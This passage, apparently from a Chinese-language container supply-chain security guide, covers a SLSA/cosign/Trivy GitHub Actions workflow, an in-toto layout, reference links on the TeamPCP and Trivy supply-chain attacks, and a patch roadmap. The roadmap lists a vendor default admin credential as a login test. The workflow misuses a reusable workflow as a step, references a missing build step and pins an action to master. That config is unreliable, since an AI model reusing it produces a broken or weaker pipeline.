    print("[*] Context-Aware Vulnerability Triage Report")
    contextual_triage(sys.argv[1], kev_ids)
```

### C.4 CI/CD 供应链安全增强

#### C.4.1 SLSA 框架集成

```yaml
# GitHub Actions: SLSA Level 3 容器构建
name: Secure Container Build (SLSA L3)
on:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read
  packages: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # 完整历史用于溯源

      # SLSA 构建器 — 证明构建来源
      - name: Generate SLSA provenance
        uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v2.0.0
        with:
          image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          digest: ${{ steps.build.outputs.digest }}

      # 扫描前验证基础镜像
      - name: Verify base image signature
        run: |
          cosign verify --certificate-identity-regexp ".*docker.*" \
            --certificate-oidc-issuer https://token.actions.githubusercontent.com \
            docker.io/library/python:3.12-slim

      # Trivy 扫描
      - name: Scan image
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: '${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}'
          format: 'sarif'
          severity: 'CRITICAL,HIGH'
          exit-code: '1'

      # SBOM 附加到镜像
      - name: Attach SBOM to image
        run: |
          syft ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }} \
            -o cyclonedx-json | \
          cosign attach sbom --sbom - \
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}

      # 签名镜像
      - name: Sign image
        uses: sigstore/cosign-installer@v3
      - run: |
          cosign sign --yes \
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
```

#### C.4.2 in-toto 供应链验证

```bash
# 安装 in-toto
pip install in-toto

# 定义供应链布局（layout）
cat > supply-chain.layout << 'EOF'
{
  "steps": [
    {"name": "clone", "expected_command": ["git", "clone"]},
    {"name": "build", "expected_command": ["docker", "build"]},
    {"name": "scan", "expected_command": ["trivy", "image"]},
    {"name": "sign", "expected_command": ["cosign", "sign"]}
  ],
  "inspect": [
    {"name": "verify-sbom", "expected_command": ["cosign", "verify-blob"]},
    {"name": "verify-scan-result", "expected_command": ["trivy", "image"]}
  ]
}
EOF

# 验证最终产物
in-toto-verify --layout supply-chain.layout \
  --layout-key layout.pub \
  --link-dir ./links
```

### C.5 中文社区精华参考

| 来源 | 主题 | 关键要点 |
|------|------|---------|
| [FreeBuf — 容器安全加固实战](https://m.freebuf.com/articles/web/453287.html) | 镜像漏洞扫描+运行时零信任 | 覆盖 CI/CD 漏洞自动化检测、镜像供应链安全、运行时攻击防御 |
| [阿里云 ACR — 镜像安全扫描](https://help.aliyun.com/zh/acr/user-guide/scan-container-images) | ACR 安全扫描功能 | 基于 Trivy 引擎的漏洞扫描，系统漏洞/应用漏洞/恶意样本/敏感数据 |
| [阿里云 ACK — 软件供应链安全](https://help.aliyun.com/zh/ack/ack-edge/security-and-compliance/supply-chain-security) | K8s 供应链最佳实践 | 镜像加签、版本不可变、24h 自动扫描 |
| [阿里云 — 容器安全解决方案](https://www.aliyun.com/solution/security/containersecurity) | 容器 ATT&CK 矩阵 | 构建→部署→运行三阶段全链路防护 |
| [安全内参 — TeamPCP 综合分析](https://www.secrss.com/articles/91229) | TeamPCP 全球攻击活动 | Trivy/Checkmarx CI/CD 投毒、跨平台传播 |
| [InfoQ — Trivy 供应链攻击](https://www.infoq.cn/article/TO5Qtp6GDufPrNOsoeMx) | 安全工具自身安全 | npm 生态投毒+GitHub Actions 管道注入 |
| [台湾 CERT — Trivy 供应链警告](https://www.twcert.org.tw/tw/cp-104-10807-5c50f-1.html) | TeamPCP 技术分析 | 通过 GitHub Actions 影响下游 CI/CD |
| [鼎普安全 — Trivy 供应链攻击](https://ti.dbappsecurity.com.cn/info/14618) | 攻击技术分析 | GitHub Actions 持久化 + npm 投毒 |
| [Docker 实践 — 镜像安全扫描](https://yeasy.gitbook.io/docker_practice/di-si-bu-fen-shi-zhan-pian/18_security/18.6_image_security) | SBOM + 签名验证实践 | Grype/Syft/Cosign 工具链实战 |

### C.6 防御升级路线图

#### P0 紧急（立即执行）

| 措施 | 验证方法 |
|------|---------|
| 更新 Harbor 至最新版（修复 CVE-2026-4404） | `curl -s harbor.example.com/api/v2.0/systeminfo \| jq .harbor_version` |
| 验证 Trivy 版本非 v0.69.4 | `trivy --version` + SHA256 校验 |
| 修改所有 Harbor 默认 admin 密码 | 尝试 `admin:Harbor12345` 登录应失败 |
| 扫描所有镜像中的 IngressNightmare（CVE-2025-1974） | `trivy image --severity CRITICAL k8s.gcr.io/ingress-nginx/controller:*` |
| 检查 npm/PyPI 依赖是否含 Shai-Hulud 感染包 | `trivy fs --severity CRITICAL ./package-lock.json` |

#### P1 高（7天内）

| 措施 | 工具/方法 |
|------|----------|
| CI/CD 中固定工具版本 SHA | GitHub Actions: `uses: aquasecurity/trivy-action@<sha>` |
| 启用 Cosign/SLSA 构建来源验证 | `cosign verify-blob --certificate-identity ...` |
| 部署 EPSS 辅助优先级排序 | Grype v0.92+ 或自定义脚本 |
| 审计 Harbor 机器人账号权限 | 最小权限原则，仅拉取权限 |
| 配置镜像不可变标签 | Harbor immutable tag rules |

#### P2 中（30天内）

| 措施 | 工具/方法 |
|------|----------|
| 生成并附加 SBOM 到所有生产镜像 | Syft + `cosign attach sbom` |
| 实施 VEX 文档流程 | Trivy `--vex` 参数 |
| 部署运行时安全检测 | Falco / Tetragon 监控异常行为 |
| CI/CD SLSA Level 3 构建验证 | `slsa-github-generator` |
| 定期审计容器注册表公开访问策略 | AWS ECR/GCR/ACR 策略审查 |

#### P3 低（90天内）

| 措施 | 工具/方法 |
|------|----------|
| SBOM 差异分析集成到 PR 流程 | `syft diff` + GitHub PR 评论 |
| 部署 CNAPP 统一平台 | Wiz/Orca/Aqua 评估 |
| 容器镜像 Distroless 迁移 | Google Distroless / Chainguard |
| 自动化漏洞修复（Dependabot/Renovate） | 配置自动 PR |
| 定期红队演练容器供应链攻击 | 依赖混淆/镜像投毒模拟 |
